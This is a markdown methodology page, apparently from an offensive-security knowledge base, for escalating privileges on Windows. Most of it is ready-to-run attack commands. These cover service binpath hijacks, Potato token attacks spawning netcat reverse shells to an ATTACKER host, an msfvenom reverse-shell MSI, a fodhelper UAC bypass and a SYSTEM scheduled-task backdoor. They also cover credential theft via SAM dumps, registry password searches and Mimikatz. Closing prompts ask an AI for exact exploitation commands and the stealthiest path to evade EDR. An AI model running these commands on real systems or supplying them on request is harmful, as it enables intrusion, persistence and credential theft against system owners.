---
id: "windows-privesc"
title: "Windows Privilege Escalation - Complete Methodology"
type: "technique"
category: "privilege-escalation"
subcategory: "windows"
tags: ["windows", "privesc", "service-exploit", "token", "registry", "uac-bypass", "potato", "deep-dig"]
difficulty: "advanced"
platforms: ["windows"]
related: ["linux-privesc", "ad-attacks", "post-exploitation-persistence"]
updated: "2026-03-30"
---

## Overview

Windows privilege escalation exploits misconfigurations in services, registry, tokens, and access controls to move from a standard user or service account to SYSTEM or Administrator. The attack surface is vast — Windows has decades of backward-compatible features that create escalation opportunities.

## Automated Enumeration

```powershell
# WinPEAS (most comprehensive)
winPEASany.exe quiet searchfast

# PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (C# situational awareness)
Seatbelt.exe -group=all

# SharpUp (C# privilege escalation checks)
SharpUp.exe audit

# Windows Exploit Suggester
systeminfo > sysinfo.txt
python3 windows-exploit-suggester.py --database 2026-03-30-mssb.xls --systeminfo sysinfo.txt
```

## Service Misconfigurations

### Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# If path is: C:\Program Files\My Service\service.exe
# Windows tries: C:\Program.exe, C:\Program Files\My.exe, etc.
# Place payload at the gap in the path

# Check service permissions
sc qc ServiceName
accesschk.exe -ucqv ServiceName
```

### Weak Service Permissions
```cmd
# Find services with weak DACLs
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# Modify service binary path
sc config VulnService binpath= "C:\temp\reverse_shell.exe"
sc stop VulnService
sc start VulnService

# Or change to add user
sc config VulnService binpath= "net localgroup administrators attacker /add"
```

### Writable Service Binaries
```cmd
# Check if you can write to the service binary location
icacls "C:\Program Files\Service\service.exe"

# Replace the binary with your payload
copy C:\temp\reverse_shell.exe "C:\Program Files\Service\service.exe"
sc stop ServiceName
sc start ServiceName
```

## Token Impersonation (Potato Attacks)

```powershell
# Check current privileges
whoami /priv

# SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = Potato time

# GodPotato (2024+, works on latest Windows)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\nc.exe -e cmd.exe ATTACKER 4444"

# SweetPotato (JuicyPotato successor)
SweetPotato.exe -p C:\temp\nc.exe -a "-e cmd.exe ATTACKER 4444"

# PrintSpoofer (if Print Spooler is running)
PrintSpoofer64.exe -i -c cmd

# RoguePotato
RoguePotato.exe -r ATTACKER_IP -e "C:\temp\shell.exe" -l 9999

# Check available tokens (Meterpreter)
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

## Registry Exploits

```cmd
# AlwaysInstallElevated (install MSI as SYSTEM)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi

# Autorun programs (writable registry keys)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Saved credentials in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Stored autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Fodhelper.exe bypass (no patch as of 2026)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# UACME (collection of 70+ UAC bypasses)
akagi64.exe 61 C:\temp\shell.exe

# Event Viewer bypass
# Disk Cleanup bypass
# CMSTP bypass
```

## Scheduled Tasks

```cmd
# List scheduled tasks
schtasks /query /fo TABLE /nh

# Check for writable task binaries
icacls "C:\path\to\scheduled\binary.exe"

# Check task permissions
accesschk.exe -dqv "C:\path\to\task\directory"

# Create malicious task (if you have permissions)
schtasks /create /tn "Backdoor" /tr "C:\temp\shell.exe" /sc ONLOGON /ru SYSTEM
```

## Credential Harvesting

```cmd
# Saved credentials
cmdkey /list

# Run command as saved user
runas /savecred /user:admin "C:\temp\shell.exe"

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="NetworkName" key=clear

# SAM database (requires SYSTEM)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Offline: secretsdump.py -sam sam.bak -system system.bak LOCAL

# DPAPI credential extraction
mimikatz # sekurlsa::dpapi
```

## Deep Dig Prompts

```
Given this WinPEAS/PowerUp output [paste]:
1. Identify the top 5 escalation vectors ranked by reliability.
2. For each, provide exact exploitation commands.
3. Check for Potato attack viability (SeImpersonatePrivilege).
4. Identify stored credentials, scheduled tasks with weak permissions, and writable service paths.
5. Suggest the stealthiest escalation path to avoid EDR detection.
```

```
I have a shell as [user] on [Windows version/build]:
1. Which Potato variant works on this exact build?
2. Suggest UAC bypasses for this Windows version.
3. Check for kernel exploits (PrintNightmare, HiveNightmare, etc.).
4. Recommend credential harvesting techniques available at this privilege level.
```

## Tools

- **WinPEAS** — Comprehensive automated enumeration
- **PowerUp** — PowerShell privilege escalation checker
- **Seatbelt** — Security-relevant host info
- **SharpUp** — C# privilege escalation checks
- **GodPotato** — Latest token impersonation (2024+)
- **PrintSpoofer** — Pipe-based impersonation
- **UACME** — 70+ UAC bypass methods
- **Mimikatz** — Credential extraction
- **Rubeus** — Kerberos interaction
